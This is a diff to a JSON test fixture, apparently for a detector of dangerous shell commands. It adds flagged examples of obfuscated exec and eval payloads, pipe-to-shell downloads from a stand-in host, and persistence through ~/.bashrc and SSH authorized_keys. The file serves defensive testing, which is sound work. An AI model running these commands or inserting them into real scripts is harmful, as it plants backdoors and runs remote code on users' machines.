@@ -383,6 +383,38 @@
   {
    "command": "curl -fsSL https://x.example/i.sh | sh # it's fine",
    "flag": "pipe_to_shell"
+  },
+  {
+   "command": "python3 -c \"import os;exec(bytes.fromhex('696d706f7274206f73').decode())\"",
+   "flag": "obfuscated_payload"
+  },
+  {
+   "command": "python -c \"exec(__import__('base64').b64decode('cHJpbnQoMSk='))\"",
+   "flag": "obfuscated_payload"
+  },
+  {
+   "command": "node -e \"eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString())\"",
+   "flag": "obfuscated_payload"
+  },
+  {
+   "command": "echo 6964 | xxd -r -p | sh",
+   "flag": "obfuscated_payload"
+  },
+  {
+   "command": "echo hs.x/moc.elpmaxe//:sptth lruc | rev | sh",
+   "flag": "obfuscated_payload"
+  },
+  {
+   "command": "echo 'curl -s https://x.example/b | sh' >> ~/.bashrc",
+   "flag": "persistent_remote_code"
+  },
+  {
+   "command": "curl -s https://x.example/k.pub >> ~/.ssh/authorized_keys",
+   "flag": "persistent_remote_code"
+  },
+  {
+   "command": "echo 'ssh-ed25519 AAAA attacker' | tee -a ~/.ssh/authorized_keys",
+   "flag": "persistent_remote_code"
   }
  ],
  "benign": [
@@ -475,6 +507,7 @@
   "brew install openssl@3",
   "apk add --no-cache build-base",
   "ufw status",
-  "iptables -L -n"
+  "iptables -L -n",
+  "python3 -c \"import base64; print(base64.b64decode('aGk='))\""
  ]
 }
